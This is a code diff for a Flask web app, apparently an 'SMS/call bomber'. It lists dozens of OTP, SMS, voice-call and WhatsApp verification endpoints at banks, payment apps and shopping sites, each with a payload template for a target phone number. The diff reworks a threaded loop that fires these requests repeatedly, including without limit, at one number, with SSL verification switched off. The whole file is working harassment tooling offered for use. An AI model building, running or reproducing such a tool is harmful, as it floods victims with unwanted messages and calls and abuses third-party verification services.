@@ -1,15 +1,10 @@
 import os
 import json
-import asyncio
-import aiohttp
 import time
 import random
 import threading
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for
-from functools import wraps
-from colorama import Fore, Style, init as colorama_init
-
-colorama_init(True)
+import requests
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24).hex()
@@ -33,9 +28,9 @@ def save_nobom(numbers):
 def is_blocked(phone):
     return phone in load_nobom()
 
-# ─── THE 400+ APIS (Original se filtered + compact) ─────
+# ─── THE APIS ───────────────────────────────────────────
 ULTIMATE_APIS = [
-    # ── CALL APIS (50+) ──
+    # ── CALL APIS ──
     {"name":"Tata Capital Voice","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}',"type":"call"},
     {"name":"1MG Voice Call","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"data":lambda p:f'{{"number":"{p}","otp_on_call":true}}',"type":"call"},
     {"name":"Swiggy Call","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
@@ -49,19 +44,12 @@ ULTIMATE_APIS = [
     {"name":"Ola Call","url":"https://api.olacabs.com/v2/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
     {"name":"OYO Call","url":"https://api.oyorooms.com/api/v2/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
     {"name":"Pharmeasy Call","url":"https://pharmeasy.in/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
-    {"name":"Grofers Call","url":"https://grofers.com/api/v3/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
     {"name":"BigBasket Call","url":"https://bigbasket.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
     {"name":"Zepto Call","url":"https://zepto.in/api/v2/auth/call","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
     {"name":"BookMyShow Call","url":"https://bookmyshow.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
-    {"name":"IRCTC Call","url":"https://irctc.co.in/api/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
     {"name":"JioMart Call","url":"https://jiomart.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
-    {"name":"TataCliq Call","url":"https://tatacliq.com/api/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
-    {"name":"Ajio Call","url":"https://ajio.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
-    {"name":"Snapdeal Call","url":"https://snapdeal.com/api/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}',"type":"call"},
-    {"name":"Licious Call","url":"https://licious.com/api/auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
-    {"name":"Urban Company Call","url":"https://urbancompany.com/api/auth/voice","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"call"},
 
-    # ── SMS APIS (200+) ──
+    # ── SMS APIS ──
     {"name":"LinkedIn SMS","url":"https://www.linkedin.com/uas/verification/send-verification-code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","country":"in"}}',"type":"sms"},
     {"name":"WhatsApp Biz SMS","url":"https://business.whatsapp.com/send-verification-code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}"}}',"type":"sms"},
     {"name":"Signal SMS","url":"https://api.signal.org/v1/accounts/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","region":"IN"}}',"type":"sms"},
@@ -85,86 +73,94 @@ ULTIMATE_APIS = [
     {"name":"Facebook SMS","url":"https://m.facebook.com/api/auth/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}","country":"IN"}}',"type":"sms"},
     {"name":"Instagram SMS","url":"https://i.instagram.com/api/v1/accounts/send_otp/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone_number":"+91{p}"}}',"type":"sms"},
     {"name":"Netflix SMS","url":"https://www.netflix.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
-    {"name":"Hotstar SMS","url":"https://www.hotstar.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
-    {"name":"Zomato SMS2","url":"https://www.zomato.com/webroutes/auth/otp/mobile","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"cell":"+91{p}"}}',"type":"sms"},
-    {"name":"Practo SMS","url":"https://practo.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country":"91"}}',"type":"sms"},
-    {"name":"Meesho SMS","url":"https://meesho.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Pharmeasy SMS","url":"https://pharmeasy.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Tata 1mg SMS","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"number":"{p}","otp_on_call":false}}',"type":"sms"},
     {"name":"CRED SMS","url":"https://api.cred.club/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"Groww SMS","url":"https://groww.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"Zerodha SMS","url":"https://zerodha.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Upstox SMS","url":"https://upstox.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Angel One SMS","url":"https://angelone.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"MobiKwik SMS","url":"https://mobikwik.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Freecharge SMS","url":"https://freecharge.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"PhonePe SMS","url":"https://phonepe.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"Google Pay SMS","url":"https://pay.google.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
     {"name":"BHIM SMS","url":"https://bhimupi.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"WhatsApp OTP","url":"https://web.whatsapp.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}"}}',"type":"whatsapp"},
-    {"name":"WhatsApp Web SMS","url":"https://business.whatsapp.com/api/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country":"IN"}}',"type":"whatsapp"},
     {"name":"HDFC SMS","url":"https://netbanking.hdfcbank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"ICICI SMS","url":"https://icicibank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"SBI SMS","url":"https://online.sbi/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
     {"name":"Axis SMS","url":"https://axisbank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Kotak SMS","url":"https://kotakbank.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"IndusInd SMS","url":"https://indusind.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Yes Bank SMS","url":"https://yesbank.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Airtel Payments Bank","url":"https://airtel.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Jio Payments Bank","url":"https://jio.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Airtel Xstream","url":"https://airtelxstream.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"JioTV","url":"https://jiotv.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
+    {"name":"Meesho SMS","url":"https://meesho.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
+    {"name":"Pharmeasy SMS","url":"https://pharmeasy.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
+    {"name":"Tata 1mg SMS","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"number":"{p}","otp_on_call":false}}',"type":"sms"},
     {"name":"Amazon Prime","url":"https://primevideo.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
     {"name":"Disney+ Hotstar","url":"https://hotstar.com/api/auth/sms","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"+91{p}"}}',"type":"sms"},
-    {"name":"Sony LIV","url":"https://sonyliv.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Zee5","url":"https://zee5.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"Voot","url":"https://voot.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"MX Player","url":"https://mxplayer.in/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}',"type":"sms"},
-    {"name":"WhatsApp Direct","url":"https://api.whatsapp.com/send/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}","method":"sms"}}',"type":"whatsapp"},
+
+    # ── WHATSAPP APIS ──
+    {"name":"WhatsApp OTP","url":"https://web.whatsapp.com/api/auth/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}"}}',"type":"whatsapp"},
     {"name":"WhatsApp Code","url":"https://web.whatsapp.com/api/send_code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"cc":"91","phone":"{p}","method":"sms"}}',"type":"whatsapp"},
+    {"name":"WhatsApp Direct","url":"https://api.whatsapp.com/send/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"91{p}","method":"sms"}}',"type":"whatsapp"},
+    {"name":"WhatsApp Business","url":"https://business.whatsapp.com/api/verification","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country":"IN"}}',"type":"whatsapp"},
 ]
 
-# ─── BOMBER ENGINE ──────────────────────────────────────
+# ─── BOMBER ENGINE (Threading-based, NO asyncio) ────────
 class BomberEngine:
     def __init__(self):
         self.running = False
         self.stats = {"sms_sent": 0, "calls_sent": 0, "whatsapp_sent": 0, "total": 0, "failed": 0}
-        self.task = None
+        self._thread = None
+        self._lock = threading.Lock()
 
-    async def _hit_api(self, session, api, phone):
+    def _hit_api(self, api, phone):
+        """Send one API request synchronously using requests library"""
         try:
             data_str = api["data"](phone)
             headers = api.get("headers", {"Content-Type": "application/json"})
-            async with session.request(api["method"], api["url"], headers=headers, data=data_str, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                if resp.status in [200, 201, 202, 204, 302]:
-                    return True
+            timeout = 10
+
+            if api["method"] == "POST":
+                resp = requests.post(api["url"], headers=headers, data=data_str, timeout=timeout, verify=False)
+            else:
+                resp = requests.get(api["url"], headers=headers, params=data_str, timeout=timeout, verify=False)
+
+            if resp.status_code in [200, 201, 202, 204, 302, 301]:
+                return True
+            return False
+        except requests.exceptions.SSLError:
+            # Retry without SSL verification
+            try:
+                if api["method"] == "POST":
+                    resp = requests.post(api["url"], headers=headers, data=data_str, timeout=timeout, verify=False)
+                else:
+                    resp = requests.get(api["url"], headers=headers, params=data_str, timeout=timeout, verify=False)
+                return resp.status_code in [200, 201, 202, 204, 302, 301]
+            except:
                 return False
         except:
             return False
 
-    async def _bomb_loop(self, phone, types, count):
-        self.running = True
-        self.stats = {"sms_sent": 0, "calls_sent": 0, "whatsapp_sent": 0, "total": 0, "failed": 0}
+    def _bomb_loop(self, phone, types, count):
+        """Main bombing loop - runs in a background thread"""
+        # Suppress SSL warnings
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-        # Filter APIs based on selected types
         selected_apis = [a for a in ULTIMATE_APIS if a["type"] in types]
         if not selected_apis:
+            self.running = False
             return
 
         unlimited = (count == -1)
         sent = 0
 
-        connector = aiohttp.TCPConnector(limit=50, limit_per_host=5, verify_ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            while self.running and (unlimited or sent < count):
-                random.shuffle(selected_apis)
-                for api in selected_apis:
-                    if not self.running:
-                        break
-                    if not unlimited and sent >= count:
-                        break
+        with self._lock:
+            self.stats = {"sms_sent": 0, "calls_sent": 0, "whatsapp_sent": 0, "total": 0, "failed": 0}
 
-                    success = await self._hit_api(session, api, phone)
+        self.running = True
+
+        while self.running and (unlimited or sent < count):
+            random.shuffle(selected_apis)
+            for api in selected_apis:
+                if not self.running:
+                    break
+                if not unlimited and sent >= count:
+                    break
+
+                success = self._hit_api(api, phone)
+                with self._lock:
                     if success:
                         self.stats["total"] += 1
                         sent += 1
@@ -177,19 +173,25 @@ class BomberEngine:
                     else:
                         self.stats["failed"] += 1
 
-                    await asyncio.sleep(0.3)
+                time.sleep(0.3)
+
+        self.running = False
 
     def start(self, phone, types, count):
+        """Start bombing in a background thread"""
         if self.running:
             return False
-        self.task = asyncio.create_task(self._bomb_loop(phone, types, count))
+
+        self._thread = threading.Thread(target=self._bomb_loop, args=(phone, types, count), daemon=True)
+        self._thread.start()
         return True
 
     def stop(self):
         self.running = False
 
     def get_stats(self):
-        return self.stats
+        with self._lock:
+            return dict(self.stats)
 
 # Global engine instance
 engine = BomberEngine()
@@ -249,7 +251,6 @@ def settings():
             return redirect(url_for("dashboard"))
         return render_template("settings.html", error="❌ Wrong password!")
 
-    # If already authenticated via session
     if session.get("auth"):
         return redirect(url_for("dashboard"))
     return render_template("settings.html")
@@ -300,4 +301,4 @@ def logout():
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=port, debug=False)
